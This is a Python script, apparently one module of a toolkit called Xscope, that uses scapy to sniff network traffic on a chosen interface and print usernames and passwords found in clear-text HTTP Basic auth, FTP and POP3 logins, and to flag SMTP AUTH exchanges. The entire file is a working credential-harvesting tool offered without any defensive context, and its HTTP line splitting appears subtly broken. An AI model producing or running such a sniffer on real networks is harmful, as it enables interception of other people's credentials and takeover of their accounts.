#!/usr/bin/env python3
"""
Credential Sniffer – Xscope Option 6
Sniffs HTTP, FTP, POP3, SMTP for clear-text creds.
"""

from scapy.all import sniff, TCP, Raw
from base64 import b64decode
from colorama import Fore, init
init(autoreset=True)

HTTP_PORTS = {80, 8080, 8000}
FTP_PORT   = 21
SMTP_PORTS = {25, 587}
POP_PORTS  = {110, 995}

def parse_http(payload):
    if b"Authorization: Basic" in payload:
        line = [l for l in payload.split(b"\\r\\n") if b"Authorization" in l][0]
        token = line.split()[2]
        try:
            user, pwd = b64decode(token).decode().split(":", 1)
            print(Fore.YELLOW + f"[HTTP] {user}:{pwd}")
        except: pass

def parse_ftp(payload):
    if payload.startswith(b"USER"):
        user = payload.split()[1].decode()
        print(Fore.YELLOW + f"[FTP] USER {user}")
    if payload.startswith(b"PASS"):
        pwd = payload.split()[1].decode()
        print(Fore.YELLOW + f"[FTP] PASS {pwd}")

def parse_pop(payload):
    if payload.startswith(b"USER") or payload.startswith(b"PASS"):
        parts = payload.decode().split()
        if len(parts) >= 2:
            print(Fore.YELLOW + f"[POP3] {' '.join(parts[:2])}")

def parse_smtp(payload):
    if b"AUTH LOGIN" in payload:
        print(Fore.YELLOW + "[SMTP] AUTH LOGIN detected (credentials base64 in next packets)")

def packet_handler(pkt):
    if TCP in pkt and Raw in pkt:
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        payload = bytes(pkt[Raw].load)

        if sport in HTTP_PORTS or dport in HTTP_PORTS:
            parse_http(payload)
        elif sport == FTP_PORT or dport == FTP_PORT:
            parse_ftp(payload)
        elif sport in POP_PORTS or dport in POP_PORTS:
            parse_pop(payload)
        elif sport in SMTP_PORTS or dport in SMTP_PORTS:
            parse_smtp(payload)

def run():
    iface = input("Interface to sniff on (e.g., eth0): ").strip() or None
    print(Fore.CYAN + "[*] Sniffing... Press Ctrl+C to stop.")
    sniff(iface=iface, prn=packet_handler, store=0)
